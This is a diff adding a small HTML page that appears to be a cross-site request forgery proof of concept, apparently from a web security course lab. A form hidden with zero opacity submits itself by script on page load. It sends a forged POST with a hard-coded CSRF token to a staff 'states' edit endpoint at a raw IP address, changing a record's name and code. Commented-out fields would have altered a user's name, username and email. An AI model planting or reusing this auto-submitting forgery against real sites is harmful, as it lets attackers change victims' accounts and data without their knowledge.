@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  </head>
+  <body>
+    <!-- <img src="./Assets/hacker.jpg" /> -->
+    <form name="csrf" action="https://35.184.88.145/red/public/staff/states/edit.php?id=1" method="POST" style="opacity:0"> 
+      <input type="hidden" name="csrf_token" value="a322d4e74b0daa4e05dcf337faf7287c" />
+      <!-- <input type="text" name="first_name" value="James" />
+      <input type="text" name="last_name" value="Munroe" />
+      <input type="text" name="username" value="jmonroe99" />
+      <input type="text" name="email" value="test@test.com" /> -->
+      <!-- <input type="submit" value="Update" /> -->
+      
+      <input type="text" name="name" value="Berea" /><br />
+      Code:<br />
+      <input type="text" name="code" value="BC" /><br />
+      Country ID:<br />
+      <input type="text" name="country_id" value="2" /><br />
+      <br />
+
+    </form>
+    <script>
+      document.csrf.submit();
+    </script>
+  </body>
+</html>
